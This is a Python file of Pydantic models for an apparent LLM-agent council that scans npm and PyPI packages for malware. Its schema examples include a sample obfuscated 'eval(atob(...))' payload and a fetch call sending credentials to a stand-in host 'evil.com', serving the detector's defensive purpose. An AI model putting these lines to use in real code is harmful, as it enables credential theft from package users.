"""
Data Models
===========
Pydantic models for type safety and validation.

Models:
- PackageData: Input data for analysis
- AgentResponse: Individual agent's assessment
- ConsensusResult: Aggregated consensus from all agents
- CouncilDecision: Final decision with all metadata
"""

from typing import List, Dict, Any, Optional
from datetime import datetime
from pydantic import BaseModel, Field, validator


class PackageData(BaseModel):
    """Input package data for analysis."""
    
    # Core metadata
    package_name: str = Field(..., description="Package name (e.g., 'lodash')")
    version: str = Field(..., description="Package version (e.g., '4.17.21')")
    registry: str = Field(default="npm", description="Package registry (npm, pypi)")
    description: Optional[str] = Field(None, description="Package description")
    author: Optional[str] = Field(None, description="Package author/maintainer")
    
    # Package statistics
    downloads_last_month: Optional[int] = Field(None, description="Download count last month")
    package_age_days: Optional[int] = Field(None, description="Days since first publication")
    
    # Code segments (suspicious parts extracted)
    code_segments: Optional[List[Dict[str, Any]]] = Field(
        default_factory=list,
        description="List of suspicious code segments with context"
    )
    
    # Static analysis results
    static_analysis: Optional[Dict[str, Any]] = Field(
        None,
        description="Static analysis results (entropy, APIs, obfuscation)"
    )
    
    # Behavioral analysis results
    behavioral_analysis: Optional[Dict[str, Any]] = Field(
        None,
        description="Sandbox execution results (syscalls, network, files)"
    )
    
    # Dependency analysis results
    dependency_analysis: Optional[Dict[str, Any]] = Field(
        None,
        description="Dependency graph analysis (typosquatting, suspicious deps)"
    )
    
    # Additional metadata
    readme: Optional[str] = Field(None, description="Package README content")
    repository_url: Optional[str] = Field(None, description="Source repository URL")
    homepage: Optional[str] = Field(None, description="Package homepage")
    
    class Config:
        json_schema_extra = {
            "example": {
                "package_name": "suspicious-lib",
                "version": "1.2.3",
                "registry": "npm",
                "description": "A utility library",
                "author": "newuser123",
                "downloads_last_month": 1500,
                "package_age_days": 5,
                "code_segments": [
                    {
                        "code": "eval(atob('encoded_payload'))",
                        "location": "index.js:45",
                        "reason": "eval_with_encoded_string"
                    }
                ],
                "static_analysis": {
                    "high_entropy_count": 2,
                    "dangerous_apis": ["eval", "exec"],
                    "obfuscation_score": 85
                }
            }
        }


class AgentResponse(BaseModel):
    """Individual agent's analysis response."""
    
    agent_name: str = Field(..., description="Agent identifier (e.g., 'code_intelligence')")
    model_name: str = Field(..., description="LLM model used (e.g., 'llama-3.3-70b-versatile')")
    
    # Core assessment
    risk_score: float = Field(..., ge=0, le=100, description="Risk score (0-100)")
    confidence: float = Field(..., ge=0, le=100, description="Confidence level (0-100)")
    verdict: str = Field(..., description="Verdict: 'malicious', 'benign', 'uncertain', or 'error'")
    
    # Detailed analysis
    explanation: str = Field(..., description="Human-readable explanation of findings")
    details: Dict[str, Any] = Field(
        default_factory=dict,
        description="Agent-specific detailed findings"
    )
    
    # Metadata
    tokens_used: int = Field(default=0, description="Total tokens consumed")
    analysis_timestamp: datetime = Field(
        default_factory=datetime.utcnow,
        description="When analysis was performed"
    )
    
    @validator('verdict')
    def validate_verdict(cls, v):
        """Validate verdict is one of allowed values."""
        allowed = ['malicious', 'benign', 'uncertain', 'error']
        if v not in allowed:
            raise ValueError(f"Verdict must be one of {allowed}")
        return v
    
    class Config:
        json_schema_extra = {
            "example": {
                "agent_name": "code_intelligence",
                "model_name": "llama-3.3-70b-versatile",
                "risk_score": 96,
                "confidence": 92,
                "verdict": "malicious",
                "explanation": "Code contains eval() with base64-encoded payload that accesses credentials",
                "details": {
                    "code_behavior": "Reads AWS credentials and sends to external server",
                    "intent_match": False,
                    "deobfuscated_code": "fetch('http://evil.com', {data: credentials})",
                    "malicious_indicators": ["credential_theft", "network_exfiltration"]
                },
                "tokens_used": 450
            }
        }


class ConsensusResult(BaseModel):
    """Aggregated consensus from all agents."""
    
    # Final scores
    final_risk_score: float = Field(..., ge=0, le=100, description="Final consensus risk score")
    final_confidence: float = Field(..., ge=0, le=100, description="Final consensus confidence")
    final_verdict: str = Field(..., description="Final verdict: 'malicious', 'benign', 'uncertain', or 'error'")
    threat_level: str = Field(..., description="Threat level: 'critical', 'high', 'medium', 'low', 'unknown'")
    
    # Agreement metrics
    agreement_level: str = Field(..., description="Agreement level: 'strong', 'moderate', 'weak', 'none'")
    variance: float = Field(..., description="Score variance (max - min)")
    
    # Individual agent scores
    agent_scores: Dict[str, float] = Field(
        default_factory=dict,
        description="Individual agent risk scores"
    )
    agent_verdicts: Dict[str, str] = Field(
        default_factory=dict,
        description="Individual agent verdicts"
    )
    
    # Debate information
    debate_conducted: bool = Field(default=False, description="Whether debate was conducted")
    debate_result: Optional[Dict[str, Any]] = Field(None, description="Debate results if conducted")
    
    # Review flags
    flag_for_review: bool = Field(default=False, description="Whether human review is needed")
    
    # Explanation
    explanation: str = Field(..., description="Human-readable consensus explanation")
    
    # Metadata
    total_tokens_used: int = Field(default=0, description="Total tokens used by all agents")
    consensus_timestamp: datetime = Field(
        default_factory=datetime.utcnow,
        description="When consensus was built"
    )
    
    @validator('final_verdict')
    def validate_final_verdict(cls, v):
        """Validate final verdict."""
        allowed = ['malicious', 'benign', 'uncertain', 'error']
        if v not in allowed:
            raise ValueError(f"Final verdict must be one of {allowed}")
        return v
    
    @validator('threat_level')
    def validate_threat_level(cls, v):
        """Validate threat level."""
        allowed = ['critical', 'high', 'medium', 'low', 'unknown']
        if v not in allowed:
            raise ValueError(f"Threat level must be one of {allowed}")
        return v
    
    @validator('agreement_level')
    def validate_agreement_level(cls, v):
        """Validate agreement level."""
        allowed = ['strong', 'moderate', 'weak', 'none']
        if v not in allowed:
            raise ValueError(f"Agreement level must be one of {allowed}")
        return v
    
    class Config:
        json_schema_extra = {
            "example": {
                "final_risk_score": 96.0,
                "final_confidence": 92.0,
                "final_verdict": "malicious",
                "threat_level": "critical",
                "agreement_level": "strong",
                "variance": 4.0,
                "agent_scores": {
                    "code_intelligence": 96,
                    "threat_intelligence": 98,
                    "behavioral_intelligence": 94
                },
                "agent_verdicts": {
                    "code_intelligence": "malicious",
                    "threat_intelligence": "malicious",
                    "behavioral_intelligence": "malicious"
                },
                "debate_conducted": False,
                "flag_for_review": False,
                "explanation": "Strong consensus: all agents detected credential theft with network exfiltration",
                "total_tokens_used": 2200
            }
        }


class CouncilDecision(BaseModel):
    """Final council decision with all metadata."""
    
    # Package identification
    package_name: str = Field(..., description="Package name")
    package_version: str = Field(..., description="Package version")
    registry: str = Field(default="npm", description="Package registry")
    
    # Decision
    final_risk_score: float = Field(..., ge=0, le=100, description="Final risk score")
    final_confidence: float = Field(..., ge=0, le=100, description="Final confidence")
    verdict: str = Field(..., description="Final verdict")
    threat_level: str = Field(..., description="Threat level")
    
    # Complete analysis chain
    consensus_result: ConsensusResult = Field(..., description="Full consensus result")
    agent_responses: List[AgentResponse] = Field(
        default_factory=list,
        description="All individual agent responses"
    )
    
    # Actions
    recommended_actions: List[str] = Field(
        default_factory=list,
        description="Recommended response actions"
    )
    requires_human_review: bool = Field(
        default=False,
        description="Whether human analyst review is required"
    )
    
    # Metadata
    decision_id: Optional[str] = Field(None, description="Unique decision identifier")
    decision_timestamp: datetime = Field(
        default_factory=datetime.utcnow,
        description="When decision was made"
    )
    analysis_duration_seconds: Optional[float] = Field(
        None,
        description="Total analysis duration"
    )
    
    # Cost tracking
    total_tokens_used: Optional[int] = Field(None, description="Total tokens consumed")
    estimated_cost_usd: Optional[float] = Field(None, description="Estimated API cost in USD")
    
    class Config:
        json_schema_extra = {
            "example": {
                "package_name": "suspicious-lib",
                "package_version": "1.2.3",
                "registry": "npm",
                "final_risk_score": 96.0,
                "final_confidence": 92.0,
                "verdict": "malicious",
                "threat_level": "critical",
                "recommended_actions": [
                    "IMMEDIATE: Unpublish package from registry",
                    "IMMEDIATE: Alert all users who downloaded this package",
                    "URGENT: Issue CVE and public security advisory"
                ],
                "requires_human_review": False,
                "total_tokens_used": 2200,
                "estimated_cost_usd": 0.0101,
                "analysis_duration_seconds": 4.2
            }
        }
    
    def to_summary(self) -> Dict[str, Any]:
        """
        Generate summary of decision for quick viewing.
        
        Returns:
            Dictionary with key decision points
        """
        return {
            "package": f"{self.package_name}@{self.package_version}",
            "verdict": self.verdict,
            "threat_level": self.threat_level,
            "risk_score": self.final_risk_score,
            "confidence": self.final_confidence,
            "requires_review": self.requires_human_review,
            "timestamp": self.decision_timestamp.isoformat()
        }
    
    def to_alert_format(self) -> Dict[str, Any]:
        """
        Generate alert format for notification systems.
        
        Returns:
            Dictionary formatted for alerts
        """
        return {
            "alert_level": self.threat_level,
            "package_identifier": f"{self.package_name}@{self.package_version}",
            "verdict": self.verdict,
            "risk_score": self.final_risk_score,
            "confidence": self.final_confidence,
            "summary": self.consensus_result.explanation[:200],
            "actions_required": self.recommended_actions[:3],  # Top 3 actions
            "timestamp": self.decision_timestamp.isoformat(),
            "requires_immediate_action": self.threat_level in ["critical", "high"]
        }


class AnalysisRequest(BaseModel):
    """Request model for package analysis."""
    
    package_data: PackageData = Field(..., description="Package data to analyze")
    
    # Options
    force_reanalysis: bool = Field(
        default=False,
        description="Force reanalysis even if cached result exists"
    )
    skip_cache: bool = Field(
        default=False,
        description="Skip cache lookup and storage"
    )
    include_agent_details: bool = Field(
        default=True,
        description="Include full agent responses in result"
    )
    
    class Config:
        json_schema_extra = {
            "example": {
                "package_data": {
                    "package_name": "test-package",
                    "version": "1.0.0",
                    "description": "Test package",
                    "code_segments": []
                },
                "force_reanalysis": False,
                "skip_cache": False,
                "include_agent_details": True
            }
        }


class AnalysisResponse(BaseModel):
    """Response model for package analysis."""
    
    decision: CouncilDecision = Field(..., description="Council decision")
    
    # Metadata
    cached: bool = Field(default=False, description="Whether result was from cache")
    analysis_version: str = Field(default="1.0.0", description="Analysis system version")
    
    class Config:
        json_schema_extra = {
            "example": {
                "decision": {
                    "package_name": "test-package",
                    "package_version": "1.0.0",
                    "verdict": "benign",
                    "threat_level": "low",
                    "final_risk_score": 15.0,
                    "final_confidence": 85.0
                },
                "cached": False,
                "analysis_version": "1.0.0"
            }
        }


class HealthCheckResponse(BaseModel):
    """Health check response model."""
    
    status: str = Field(..., description="Overall status: 'healthy', 'degraded', 'unhealthy'")
    version: str = Field(..., description="System version")
    timestamp: datetime = Field(default_factory=datetime.utcnow)
    
    # Component health
    components: Dict[str, bool] = Field(
        default_factory=dict,
        description="Health status of individual components"
    )
    
    # Statistics
    stats: Optional[Dict[str, Any]] = Field(
        None,
        description="System statistics"
    )
    
    class Config:
        json_schema_extra = {
            "example": {
                "status": "healthy",
                "version": "1.0.0",
                "components": {
                    "groq_api": True,
                    "google_ai_api": True,
                    "cache": True
                },
                "stats": {
                    "total_analyses": 1234,
                    "cache_hit_rate": 65.5
                }
            }
        }


# Utility functions for model creation
def create_package_data_from_dict(data: Dict[str, Any]) -> PackageData:
    """
    Create PackageData from dictionary.
    
    Args:
        data: Dictionary with package information
        
    Returns:
        PackageData instance
    """
    return PackageData(**data)


def create_mock_package_data(package_name: str = "test-package") -> PackageData:
    """
    Create mock package data for testing.
    
    Args:
        package_name: Package name
        
    Returns:
        Mock PackageData instance
    """
    return PackageData(
        package_name=package_name,
        version="1.0.0",
        registry="npm",
        description="Test package for analysis",
        author="test-author",
        downloads_last_month=1000,
        package_age_days=30,
        code_segments=[
            {
                "code": "console.log('hello world')",
                "location": "index.js:1",
                "reason": "test_segment"
            }
        ],
        static_analysis={
            "high_entropy_count": 0,
            "dangerous_apis": [],
            "obfuscation_score": 5
        },
        behavioral_analysis={
            "network_activity": [],
            "file_operations": [],
            "processes_spawned": []
        },
        dependency_analysis={
            "suspicious_dependencies": [],
            "typosquatting": None
        }
    )